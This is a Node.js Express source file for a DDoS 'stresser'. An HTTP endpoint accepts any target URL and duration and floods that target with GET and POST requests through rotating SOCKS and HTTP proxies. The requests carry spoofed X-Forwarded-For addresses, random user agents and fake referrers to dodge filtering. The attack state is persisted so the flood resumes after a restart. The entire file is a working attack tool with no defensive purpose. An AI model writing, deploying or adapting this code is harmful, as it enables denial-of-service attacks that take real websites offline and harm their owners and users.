const express = require("express");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const { SocksProxyAgent } = require("socks-proxy-agent");
const { HttpsProxyAgent } = require("https-proxy-agent");
const { fakeState } = require("./fakeState.js");

const app = express();
app.use(express.json());

const amount_requestsPerMS = 10000000;
const stateFilePath = path.join(__dirname, 'attackState.json');
let continueAttack = false;
let startTime = 0;
let duration = 0;
let targetUrl = '';

const langHeaders = [
    "he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7",
    "fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5",
    "en-US,en;q=0.5"
];

const referrers = [
    "http://anonymouse.org/cgi-bin/anon-www.cgi/",
    "http://coccoc.com/search#query="
];

const cipherSuites = [
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS"
];

const acceptHeaders = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
];

const proxyFilePath = path.join(__dirname, "proxy.txt");
const ualist = path.join(__dirname, "ua.txt");
const numThreads = 1000;

const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
const sanitizeUA = (userAgent) => userAgent.replace(/[^\x20-\x7E]/g, "");

const userAgents = () => {
    try {
        return fs.readFileSync(ualist, "utf-8").split("\n").map(line => line.trim());
    } catch {
        return [];
    }
};

const loadProxies = () => {
    try {
        return fs.readFileSync(proxyFilePath, "utf-8").split("\n").map(line => line.trim());
    } catch {
        return [];
    }
};

const performAttack = (url, agent) => {
    if (!continueAttack) return;
    if (Date.now() > startTime + duration) {
        continueAttack = false;
        return;
    }

    const headersForRequest = {
        "User-Agent": sanitizeUA(getRandomElement(userAgents())),
        "Accept": getRandomElement(acceptHeaders),
        "Accept-Language": getRandomElement(langHeaders),
        "Referer": getRandomElement(referrers),
        "X-Forwarded-For": `${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}`
    };

    for (let i = 0; i < amount_requestsPerMS; i++) {
        axios.get(url, {
            httpAgent: agent,
            headers: headersForRequest,
            timeout: 0
        }).catch(() => {});

        axios.post(url, {}, {
            headers: headersForRequest
        }).catch(() => {});
    }

    setImmediate(() => performAttack(url, agent));
};

const startAttack = (url, durationHours) => {
    const proxies = loadProxies();
    if (!proxies.length) return false;

    continueAttack = true;
    targetUrl = url;
    startTime = Date.now();
    duration = durationHours * 60 * 60 * 1000;

    fs.writeFileSync(stateFilePath, JSON.stringify({
        continueAttack,
        startTime,
        duration,
        targetUrl
    }));

    setTimeout(() => {
        continueAttack = false;
        try { fs.unlinkSync(stateFilePath); } catch {}
    }, duration);

    for (let i = 0; i < numThreads; i++) {
        const proxy = getRandomElement(proxies).split(":");
        const agent = proxy[0].startsWith("socks") 
            ? new SocksProxyAgent(`${proxy[0]}://${proxy[1]}:${proxy[2]}`)
            : new HttpsProxyAgent(`http://${proxy[1]}:${proxy[2]}`);
        
        performAttack(url, agent);
    }

    return true;
};

app.get("/stresser", (req, res) => {
    const url = req.query.url;
    const durationHours = parseFloat(req.query.duration) || 1;
    
    if (!url?.startsWith("http")) {
        return res.status(400).json({ error: "Invalid URL" });
    }

    if (startAttack(url, durationHours)) {
        res.json({ message: "Attack started", target: url, duration: `${durationHours}h` });
    } else {
        res.status(500).json({ error: "Failed to start attack" });
    }
});

const port = process.env.PORT || 25694;
app.listen(port, () => {
    if (fs.existsSync(stateFilePath)) {
        const state = JSON.parse(fs.readFileSync(stateFilePath));
        const remaining = (state.startTime + state.duration - Date.now()) / 3600000;
        if (remaining > 0) startAttack(state.targetUrl, remaining);
    }
    console.log(`Running on port ${port}`);
});
